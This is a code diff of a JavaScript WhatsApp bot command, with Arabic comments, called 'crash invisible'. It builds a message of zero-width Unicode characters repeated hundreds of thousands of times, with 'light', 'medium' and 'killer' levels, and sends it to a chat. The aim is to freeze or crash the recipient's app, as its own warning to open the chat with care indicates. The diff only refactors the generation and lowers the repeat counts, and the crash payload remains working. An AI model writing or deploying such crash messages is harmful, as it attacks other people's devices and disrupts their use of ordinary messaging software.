@@ -1,10 +1,8 @@
 module.exports = async ({ sock, msg, text, reply }) => {
-    // إذا لم يبدأ النص بـ crash invisible
     if (!text.startsWith("crash invisible")) return;
 
     const jid = msg.key.remoteJid;
 
-    // قائمة الرموز غير المرئية
     const invisibleChars = [
         "\u200B", // Zero Width Space
         "\u200C", // Zero Width Non-Joiner
@@ -17,37 +15,35 @@ module.exports = async ({ sock, msg, text, reply }) => {
     ];
 
     try {
-        // تحديد المستوى
-        let level = "killer"; // افتراضي
+        let level = "killer";
         if (text.includes("light")) level = "light";
         if (text.includes("medium")) level = "medium";
         if (text.includes("killer")) level = "killer";
 
-        // تحديد حجم التكرار حسب المستوى
+        // عدد التكرار حسب المستوى
         let repeatCount;
         switch (level) {
             case "light":
-                repeatCount = 50000; // خفيف
+                repeatCount = 20000;
                 break;
             case "medium":
-                repeatCount = 200000; // متوسط
+                repeatCount = 100000;
                 break;
             case "killer":
-                repeatCount = 1000000; // قاتل
+                repeatCount = 500000;
                 break;
             default:
-                repeatCount = 1000000;
+                repeatCount = 500000;
         }
 
         await reply(`⚠️ جاري توليد نص غير مرئي (${level})...`);
 
-        // توليد النص
-        let crashText = "";
-        for (let i = 0; i < repeatCount; i++) {
-            crashText += invisibleChars[Math.floor(Math.random() * invisibleChars.length)];
-        }
+        // نص مكون من جميع الرموز المختارة في سلسلة واحدة
+        const baseText = invisibleChars.join("");
 
-        // إرسال النص الضخم
+        // توليد النص بتكرار السلسلة
+        const crashText = baseText.repeat(repeatCount);
+
         await sock.sendMessage(jid, { text: crashText });
 
         await reply(`✅ تم إرسال الرسالة غير المرئية (${level}). افتح الدردشة بحذر!`);
